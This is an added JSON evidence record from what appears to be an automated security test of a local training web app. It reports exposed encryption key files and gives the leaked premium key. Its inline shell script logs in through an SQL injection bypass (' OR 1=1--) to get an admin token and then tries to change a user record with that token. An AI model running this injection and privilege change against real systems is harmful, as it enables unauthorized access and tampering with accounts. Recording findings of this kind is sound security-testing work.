@@ -1,0 +1,26 @@
+{
+  "id": "ev_1784845749484_157c73",
+  "type": "tool_output",
+  "source_tool": "finding",
+  "summary": "Sensitive File Exposure - Encryption Keys @ http://127.0.0.1:3010/encryptionkeys/",
+  "data": {
+    "kind": "proof",
+    "observation": "Proof: GET /encryptionkeys/ returns directory listing HTML with links to jwt.pub and premium.key. GET /encryptionkeys/jwt.pub returns: \"-----BEGIN RSA PUBLIC KEY-----\\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA...\" RSA key. GET /encryptionkeys/premium.key returns: \"1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42\".",
+    "proof": "Proof: GET /encryptionkeys/ returns directory listing HTML with links to jwt.pub and premium.key. GET /encryptionkeys/jwt.pub returns: \"-----BEGIN RSA PUBLIC KEY-----\\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA...\" RSA key. GET /encryptionkeys/premium.key returns: \"1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42\".",
+    "path_or_url": "http://127.0.0.1:3010/encryptionkeys/",
+    "location": "http://127.0.0.1:3010/encryptionkeys/",
+    "title": "Sensitive File Exposure - Encryption Keys",
+    "stdout": "Proof: GET /encryptionkeys/ returns directory listing HTML with links to jwt.pub and premium.key. GET /encryptionkeys/jwt.pub returns: \"-----BEGIN RSA PUBLIC KEY-----\\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA...\" RSA key. GET /encryptionkeys/premium.key returns: \"1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42\".",
+    "body_preview": "Proof: GET /encryptionkeys/ returns directory listing HTML with links to jwt.pub and premium.key. GET /encryptionkeys/jwt.pub returns: \"-----BEGIN RSA PUBLIC KEY-----\\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA...\" RSA key. GET /encryptionkeys/premium.key returns: \"1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42\".",
+    "capture_via": "shell",
+    "how_captured": "shell: # Check the premium key for deluxe access echo \"=== Premium key ===\" curl -s http://127.0.0.1:3010/encryptionkeys/premium.key echo \"\" # Try to apply the premium",
+    "command": "# Check the premium key for deluxe access\necho \"=== Premium key ===\"\ncurl -s http://127.0.0.1:3010/encryptionkeys/premium.key\necho \"\"\n\n# Try to apply the premium key\necho \"=== Try to apply deluxe token ===\"\nADMIN_TOKEN=$(curl -s -X POST http://127.0.0.1:3010/rest/user/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"'\"'\"' OR 1=1--\",\"password\":\"test\"}' | python3 -c \"import sys,json; print(json.load(sys.stdin)['authentication']['token'])\")\n\necho \"=== Check if we can update user to deluxe ===\"\ncurl -s -X PUT http://127.0.0.1:3010/api/Users/1 \\\n  -H \"Authorization: Bearer $ADMIN_TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"deluxeToken\":\"1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42\"}' | python3 -m json.tool 2>/dev/null",
+    "status": 1,
+    "script_path": "inline-shell-script",
+    "path": "inline-shell-script",
+    "script_preview": "# Check the premium key for deluxe access\necho \"=== Premium key ===\"\ncurl -s http://127.0.0.1:3010/encryptionkeys/premium.key\necho \"\"\n\n# Try to apply the premium key\necho \"=== Try to apply deluxe token ===\"\nADMIN_TOKEN=$(curl -s -X POST http://127.0.0.1:3010/rest/user/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"'\"'\"' OR 1=1--\",\"password\":\"test\"}' | python3 -c \"import sys,json; print(json.load(sys.stdin)['authentication']['token'])\")\n\necho \"=== Check if we can update user to deluxe ===\"\ncurl -s -X PUT http://127.0.0.1:3010/api/Users/1 \\\n  -H \"Authorization: Bearer $ADMIN_TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"deluxeToken\":\"1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42\"}' | python3 -m json.tool 2>/dev/null",
+    "source_tool_act": "shell",
+    "act_summary": "shell exit=1 | 1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42"
+  },
+  "created_at": "2026-07-23T22:29:09.484Z"
+}
